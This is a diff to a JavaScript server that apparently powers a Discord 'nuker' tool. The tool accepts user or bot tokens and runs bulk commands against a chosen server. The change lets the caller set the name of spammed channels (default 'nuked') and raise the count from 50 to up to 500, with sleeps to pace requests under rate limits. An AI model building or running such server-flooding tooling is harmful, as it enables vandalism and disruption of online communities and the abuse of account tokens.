@@ -273,7 +273,7 @@ const jobs = new Map();
 const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
 app.post('/api/command', (req, res) => {
-  const { token, isBot, command, guildId } = req.body || {};
+  const { token, isBot, command, guildId, name, count } = req.body || {};
 
   if (!token || !command || !guildId) {
     return res.status(400).json({ error: 'token, command, guildId required' });
@@ -281,6 +281,9 @@ app.post('/api/command', (req, res) => {
   if (!/^\d{17,20}$/.test(String(guildId))) {
     return res.status(400).json({ error: 'guildId must be 17-20 digits' });
   }
+
+  const channelName = String(name || 'nuked').replace(/[^\w \-#().]/g, '').slice(0, 100) || 'nuked';
+  const channelCount = Math.min(Math.max(parseInt(count, 10) || 50, 1), 500);
 
   const id = 'job_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
   const job = { id, command, status: 'running', logs: [], done: 0, failed: 0, started: Date.now() };
@@ -335,12 +338,13 @@ app.post('/api/command', (req, res) => {
             await sleep(280);
           }
         } else if (command === 'CREATE_CHANNELS') {
-          for (let i = 0; i < 50; i++) {
+          log('Creating ' + channelCount + ' channels named "' + channelName + '"', 'info');
+          for (let i = 0; i < channelCount; i++) {
             try {
-              await discordRequest('POST', `/guilds/${guildId}/channels`, { name: 'nuked-' + (i + 1), type: 0 }, token, isBot);
+              await discordRequest('POST', `/guilds/${guildId}/channels`, { name: channelCount > 1 ? channelName + '-' + (i + 1) : channelName, type: 0 }, token, isBot);
               job.done++;
             } catch (e) { noteError(e); }
-            if (job.done % 10 === 0) log('Created ' + job.done + '/50', 'info');
+            if (job.done % 10 === 0) log('Created ' + job.done + '/' + channelCount, 'info');
             await sleep(300);
           }
         } else {
